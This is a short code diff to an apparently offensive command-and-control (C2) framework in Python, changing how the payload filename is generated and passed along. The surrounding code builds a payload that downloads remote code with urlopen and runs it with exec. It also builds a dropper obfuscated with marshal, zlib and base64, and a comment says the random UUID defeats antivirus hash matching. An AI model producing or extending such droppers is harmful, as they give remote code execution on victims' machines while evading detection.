@@ -148,8 +148,12 @@ class C2:
         if not os.path.isdir('payloads'):
             os.makedirs('payloads')
 
+        date = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
+        payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"
+
 
         payload = f"""url = "{url}"
+file_path = "{payload_file_name}"
 def create_moduel(url):
   code = urlopen(url).read().decode('utf-8')
   spec = importlib.util.spec_from_loader('temp', loader=None)
@@ -159,7 +163,7 @@ def create_moduel(url):
   exec(code, module.__dict__)
 
   return module
-create_moduel(url+"client.py").run(url)"""
+create_moduel(url+"client.py").run(url, file_path)"""
             
         dropper = f"""import sys,zlib,base64,marshal,json,urllib,socketio,geocoder,requests,importlib.util
 from urllib.request import urlopen
@@ -168,8 +172,6 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 #{uuid.uuid4()}"""
         #this will prevent anti-viruses from looking for hashes of the script
         
-        date = datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
-        payload_file_name = f"payload_{os_name}_{arch}_{date}_{uuid.uuid4()}"
 
         with open(f"{payload_file_name}.py", 'w') as f:
             f.writelines(dropper)
